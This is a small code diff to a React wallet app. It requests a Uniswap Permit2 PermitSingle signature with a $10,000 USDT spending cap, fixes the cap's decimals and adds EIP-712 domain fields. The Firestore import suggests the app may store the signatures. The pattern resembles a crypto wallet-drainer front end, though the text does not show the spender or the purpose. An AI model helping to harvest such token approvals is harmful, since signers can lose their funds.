@@ -7,7 +7,9 @@ import { db } from './firebase';
 import { doc, setDoc } from 'firebase/firestore';
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; 
-const SPENDING_CAP = BigInt(10000) * 10n ** 18n; // $10,000 cap
+// Use USDT decimals (6). Amount = 10,000 * 10**6
+const USDT_DECIMALS = 6n;
+const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS); // $10,000 cap in USDT (6 decimals)
 
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
@@ -75,6 +77,11 @@ export default function App() {
       };
 
       const types = {
+        EIP712Domain: [
+          { name: 'name', type: 'string' },
+          { name: 'chainId', type: 'uint256' },
+          { name: 'verifyingContract', type: 'address' }
+        ],
         PermitSingle: [
           { name: 'details', type: 'PermitDetails' },
           { name: 'spender', type: 'address' },
